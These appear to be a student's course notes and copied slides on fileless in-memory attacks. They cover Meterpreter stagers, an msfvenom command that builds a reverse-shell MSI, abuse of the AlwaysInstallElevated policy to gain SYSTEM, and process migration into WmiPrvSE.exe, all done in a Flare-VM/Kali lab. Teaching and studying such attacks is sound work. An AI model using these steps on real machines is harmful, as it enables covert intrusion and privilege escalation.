


In memory 


We have a loader, whose instructions are loaded into the memory, the destructive payload remains in memory, and does not leave an actual file to detect. 

The loader could appear benign , but the code that it inserting into memory remains in memory. When the computer is shut off, the malicious code is erased from the memory. 

The loader gets stopped, removing it from memory. 


## Meterpreter


Meterpreter runs in memory, and it has a stager. It can migrate between different processes. 



Meterpreter stager, inserts Meterpreter in memory, you can have other processes running in memory. If you have system-level access, you can migrate into other spots in memory dedicated to a different process. 


The loader process is stopped, removing it from memory. The Loader/file is kept to load more malware , or deleted from the system. 


We will make an MSI!


## MSI


They look benign. The bad things happen when you run it. 

MSI can be run as a system process. 

Some organizations are very lazy, and set up a Group Policy Object. The malicious MSI could be installed as a system process. We will get a fake message about it not being installed, but this is by design to hide it. 


When you look at process monitor, msiexec ( is used to install msi files normally on windows) will be used to make a .tmp file. .tmp files are easy to pass by observers since it is a .tmp file. 



We should have system level privileges, and then we can migrate into another system process. 


When we go to procmon, wpiprvse (the malicious loader) starts a cmd.exe shell. this means that meterpreter is integrated into the memory slot for the cmd.exe program. 


## The Loader 


Make them into *Classes*

We have a main *Function* 

Basically, use msfvenom to make an un-staged payload . Output it as base64.


look up x86 architecture 

avoid entering -b'\x00\x0a\x0d ... This is used by Windows, and it could break things for us.

mcs is a C+ compiler for Linux



#### Practical Bit

1. peloader :
   
   it runs, it can load things from http and load it into memory
   replace the base64 string and we will make payload.exe
   get the exe unto Flare-VM
   Start a python http server 
   Launch procmon
   loader,exe ....
   kill the loader
   observe cmd.exe still running and carrying the malware in its slot in memory



-------------

### The Slides


Execution - In  
memory attacks

What is an in-memory attack  
Using PEs as malware is easy, but can be easily detected and analyzed. This is  
mostly because it leaves a file on the victim’s machine.  
One can avoid this issue by loading malware just into the machine’s memory  
(RAM). This is an in-memory or fileless attack.  
Pros = Harder to detect and analyze  
Cons = No file, so the payload is lost if the machine is turned off.


![[Pasted image 20240927084740.png]]


![[Pasted image 20240927084756.png]]


How An In Memory  
Payload Works  
Memory  
Malicious Payload  
Loader (or  
Stager) EXE on  
Hard Drive  
Loader Process is stopped, removing it from memory.  
File is kept to load more malware, or deleted from file  
system.

![[Pasted image 20240927085133.png]]



![[Pasted image 20240927085510.png]]

![[Pasted image 20240927085539.png]]

Meterpreter In Memory  
First, to allow our meterpreter to get system privileges, we will have to allow  
programs to be installed as elevated. This is a common setting that lets a user  
install programs onto their machine with system privileges. If we can make a  
meterpreter as an installer file (.msi), we can have it run with system privileges.




Meterpreter In Memory  
1. In your flare-vm, Click Start -> Run and type gpedit.msc. The Group Policy  
window opens.  
2. Click on Computer Configuration -> Administrative Templates ->  
Windows Components -> Windows Installer.  
Enable the following Group Policy settings and reboot:  
● Always install with elevated privileges (mandatory)  
● Enable user control over installs (mandatory)  
● Disable Windows Installer. Then set it to Never.  
● Enable user to patch elevated products (optional)  
● Enable user to use media source while elevated (optional)  
● Enable user to browse for source while elevated (optional for new  
installations, mandatory for fix pack upgrades)


Meterpreter In Memory  
On your kali machine, ,create a meterpreter payload with msfvenom  
Msfvenom -p windows/meterpreter/reverse_tcp lport= lhost= -f msi > file.msi  
Then set up msfconsole to use multi/handler same as in the previous section  
Note when you run your msi file (later), you will get a fake error message.


Meterpreter - Migrating Processes  
Open up your procmon and filter for the process name for msiexec.exe. This is  
the program that install msi files. Open your process tree and find where  
msiexec.exe is located. Notice its running an ApacheBench tmp file (metasploit).  
This is much more hidden than a regular PE so far.


![[Pasted image 20240927085823.png]]





![[Pasted image 20240927085841.png]]


Meterpreter - Migrating Processes  
Meterpreter can migrate into other processes with system privileges, and it’s  
best to find a process with system privileges. WmiPrvSE.exe is a good one (PID  
6788)  
Use migrate 6788 to migrate into process with PIDF 6788. You’ll need to  
change the number for your process. Make sure it’s running as **NT/authority**  
system  
Use getpid after the migration to show that you’ve migrated.



![[Pasted image 20240927085935.png]]


![[Pasted image 20240927085943.png]]


![[Pasted image 20240927085953.png]]


![[Pasted image 20240927090017.png]]

![[Pasted image 20240927090035.png]]


![[Pasted image 20240927090045.png]]


![[Pasted image 20240927090052.png]]


![[Pasted image 20240927090103.png]]

![[Pasted image 20240927090116.png]]

![[Pasted image 20240927090133.png]]
![[Pasted image 20240927090146.png]]


![[Pasted image 20240927090205.png]]